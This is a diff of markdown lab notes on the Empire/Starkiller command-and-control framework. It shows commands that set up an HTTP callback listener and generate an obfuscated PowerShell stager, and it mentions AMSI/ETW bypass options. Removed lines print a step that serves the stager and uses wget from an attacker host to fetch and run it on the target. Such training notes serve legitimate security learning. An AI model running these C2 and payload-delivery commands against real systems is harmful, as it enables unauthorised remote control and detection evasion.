@@ -85,10 +85,14 @@ empire/server/data/agent/stagers/http/http.ps1
 
 ### Creating a Listener
 
-```
-CREATE LISTENER
-HTTP listener
-```
+<pre><code><strong>#select type
+</strong><strong>uselistener http
+</strong>#required
+set Name l0
+set BindIP 10.10.15.49
+set Host http://10.10.15.49
+set Port 80
+</code></pre>
 
 * Configure your listener, the only two options you will need to change are the host IP and the host port.
 * HTTP listener
@@ -96,26 +100,22 @@ HTTP listener
 * **Host** - IP to connect back to.
 * **Port** - Port to listen on.
 * **BindIP** - IP to bind to (typically localhost / 0.0.0.0)
-* These options can be used for specifying how the listener operates and runs when started and while running.
-
-```
-DefaultDelay
-DefaultJitter
-DefaultLostLimit
-```
-
 * The following options can be useful for bypassing detection techniques and creating more complex listeners.
+
+```
+set DefaultDelay 30
+set DefaultJitter 0.0-1.0 
+set DefaultLostLimit 10 #Number of missed checkins before exiting
+```
+
 * **DefaultProfile** - Will allow you to specify the profile used or User-Agent.
 * **Headers** - Since this is an HTTP listener it will specify HTTP headers.
 * **Launcher** - What launcher to use for the listener this will be prefixed on the stager.
-* **Submit**
 
 ## Stagers Overview
 
-* Starkiller uses a listener and a stager to create an agent the listener does exactly as it sounds like it, it listens on a given port for a connection back from your agent.
 * The stager is similar to a payload or reverse-shell that you would send to the target to get an agent back.
 * Empire has multiple parts to each stage to help identify each one. First is the platform this can include multi, OSx, and Windows. Second the stager type itself / launcher.
-* Below are 3 stagers that are general purpose and can be used as your basic stagers. multi/launcher is the most all-purpose stager and can be used for a variety of scenarios, this is the stager we will use for demo purposes in this room.
 * `multi/launcher` - A fairly universal stager that can be used for a variety of devices.
 * `windows/launcher_bat` - Windows Batch file
 * `multi/bash` - Basic Bash Stager
@@ -128,33 +128,20 @@ DefaultLostLimit
 ### Generating a Stager
 
 ```
-GENERATE STAGER
-windows/launcher_bat
+usestager multi/launcher
+set Obfuscate True
+set Listener l0
+set StagerRetries 10 
+set OutFile check.ps1
+set Language Powershell #bash or python
+execute
 ```
 
 * Set the listener to the one you made in the previous task
 * The stager menu can come with various options depending on the stager selected as well as optional fields.
-* `Listener` - Select which listener to use from a list of created listeners on the Empire server.
 * `Base64` - Enable or disable stager encoding with base64.
-* `Language` - Language used to create the stager: bash, PowerShell, Python, etc.
 * `SafeChecks` - Enable or disable checks for the stager.
 * Some of the optional fields include `ASMIBypass`, `Obfuscate`, `ETWBypass`, etc.
-
-## Transferring & Executing the Stager
-
-* Attacking Machine:
-* There are many ways that you can send the stager to the target machine including, `scp`, `phishing`, and `malware droppers`; for this example, we will use a basic `python3` server and wget to transfer the stager.
-
-```
-python3 -m http.server
-```
-
-* Target Machine:
-
-```
-wget TUN0_IP:8000/launcher.bat -outfile launcher.bat
-./launcher.bat
-```
 
 ## Agents Overview
 
@@ -168,7 +155,9 @@ wget TUN0_IP:8000/launcher.bat -outfile launcher.bat
 ### Using Agents
 
 * Below you can see the basic layout of the Agent interaction menu and what capabilities an agent on a device has.
-* ![image](https://user-images.githubusercontent.com/75596877/175971748-bc49499f-4208-4f4a-a9c9-98c7828ef82f.png)
+*
+
+    <figure><img src="https://user-images.githubusercontent.com/75596877/175971748-bc49499f-4208-4f4a-a9c9-98c7828ef82f.png" alt=""><figcaption></figcaption></figure>
 
 ## Module Overview
 
@@ -202,7 +191,9 @@ trollsploit
 
 * Modules require no, to very little configuration
 * Below you can see the task to run Seatbelt being assigned then the output of the module being printed to the console window.
-* ![image](https://user-images.githubusercontent.com/75596877/175973641-638e091d-7491-4c31-b62f-f489c1124351.png)
+*
+
+    <figure><img src="https://user-images.githubusercontent.com/75596877/175973641-638e091d-7491-4c31-b62f-f489c1124351.png" alt=""><figcaption></figcaption></figure>
 * Because all modules are run remotely from a task and agent this means that we do not have to worry about Anti-Virus or other possible detections.
 
 ## Plugins Overview
@@ -220,7 +211,9 @@ trollsploit
 plugin <plugin name>
 ```
 
-* ![image](https://user-images.githubusercontent.com/75596877/175974111-2045b210-d083-4d18-b36a-89ef9b7fefcb.png)
+*
+
+    <figure><img src="https://user-images.githubusercontent.com/75596877/175974111-2045b210-d083-4d18-b36a-89ef9b7fefcb.png" alt=""><figcaption></figcaption></figure>
 * You can run plugins using the start and stop commands. Depending on the plugin the flags / parameters can change for each.
 
 ```
@@ -228,4 +221,6 @@ start <plugin name>
 stop <plugin name>
 ```
 
-* ![image](https://user-images.githubusercontent.com/75596877/175974240-61be75c4-b41d-4e09-aae8-bf64208331cd.png)
+*
+
+    <figure><img src="https://user-images.githubusercontent.com/75596877/175974240-61be75c4-b41d-4e09-aae8-bf64208331cd.png" alt=""><figcaption></figcaption></figure>
